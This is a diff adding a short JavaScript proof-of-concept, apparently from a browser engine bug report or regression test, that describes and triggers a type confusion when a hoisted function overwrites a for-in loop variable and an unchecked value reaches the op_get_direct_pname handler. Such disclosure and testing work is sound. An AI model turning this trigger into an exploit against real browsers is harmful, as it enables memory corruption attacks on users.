@@ -1,0 +1,22 @@
+/*
+This is simillar to  issue 1263 . When hoisting a function onto the outer scope, if it overwrites the iteration variable for a for-in loop it should invalidate the corresponding ForInContext object, but it doesn't. As a result, an arbitrary object can be passed as the property variable to the op_get_direct_pname handler which uses the property variable directly as a string object without any check.
+
+PoC:
+*/
+
+function trigger() {
+    let o = {a: 1};
+    for (var k in o) {
+        {
+            k = 0x1234;
+
+            function k() {
+
+            }
+        }
+
+        o[k];
+    }
+}
+
+trigger();
